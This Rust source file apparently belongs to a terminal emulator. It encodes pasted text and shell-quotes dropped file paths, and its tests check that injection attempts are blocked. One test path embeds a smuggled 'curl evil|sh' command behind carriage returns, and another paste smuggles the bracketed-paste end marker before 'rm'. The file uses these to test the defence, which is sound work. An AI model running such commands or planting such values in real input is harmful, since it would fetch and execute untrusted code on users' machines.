//! Text on its way to the program: pastes and files dropped on the terminal.

use std::path::PathBuf;

use crate::input::paste_mode::PasteMode;

const BRACKET_START: &str = "\x1b[200~";
const BRACKET_END: &str = "\x1b[201~";
const SAFE: &str = "/._-+@:,%=~";
const ESCAPED: &str = "\"\\$`";

pub(crate) fn encode_paste(
    text: &str,
    mode: PasteMode,
) -> Vec<u8> {
    let cleaned = text
        .replace(BRACKET_END, "")
        .replace("\r\n", "\r")
        .replace('\n', "\r");
    match mode {
        PasteMode::Plain => cleaned.into_bytes(),
        PasteMode::Bracketed => format!("{BRACKET_START}{cleaned}{BRACKET_END}").into_bytes(),
    }
}

/// The shell text for dropped `paths`: absolute paths only, double-quoted when they need it as
/// develop's terminal does, each followed by a space. A name with a control character is skipped:
/// it could type a command. Empty when no path qualifies.
pub fn format_dropped_paths(paths: &[PathBuf]) -> String {
    paths
        .iter()
        .filter(|path| path.is_absolute())
        .filter_map(|path| path.to_str())
        .filter(|path| !path.contains(char::is_control))
        .map(|path| quote(path) + " ")
        .collect()
}

fn quote(path: &str) -> String {
    let plain = path
        .chars()
        .all(|character| character.is_alphanumeric() || SAFE.contains(character));
    if plain {
        return path.to_owned();
    }
    let quoted = path.chars().fold(String::from('"'), escape);
    quoted + "\""
}

fn escape(
    mut text: String,
    character: char,
) -> String {
    if ESCAPED.contains(character) {
        text.push('\\');
    }
    text.push(character);
    text
}

#[cfg(test)]
mod tests {
    use super::*;

    const CASES: &[(&str, &str)] = &[
        ("/a/b.txt", "/a/b.txt "),
        ("/a b/$c", "\"/a b/\\$c\" "),
        ("/it's", "\"/it's\" "),
        ("/q\"`\\", "\"/q\\\"\\`\\\\\" "),
        ("/bang!", "\"/bang!\" "),
        ("/x\rcurl evil|sh\r", ""),
        ("/esc\x1b[2J", ""),
        ("/ctl\x03", ""),
        ("relative/x", ""),
    ];

    #[test]
    fn paths_are_double_quoted_when_needed_and_control_characters_are_refused() {
        for (path, expected) in CASES {
            assert_eq!(
                format_dropped_paths(&[PathBuf::from(path)]),
                *expected,
                "{path:?}"
            );
        }
        assert_eq!(format_dropped_paths(&[]), "");
    }

    #[test]
    fn paste_normalises_newlines_brackets_on_request_and_blocks_the_end_marker() {
        let cases = [
            ("a\r\nb\nc", PasteMode::Plain, b"a\rb\rc".to_vec()),
            ("x", PasteMode::Bracketed, b"\x1b[200~x\x1b[201~".to_vec()),
            (
                "a\x1b[201~rm",
                PasteMode::Bracketed,
                b"\x1b[200~arm\x1b[201~".to_vec(),
            ),
        ];
        for (text, mode, expected) in cases {
            assert_eq!(encode_paste(text, mode), expected, "{text:?}");
        }
    }
}
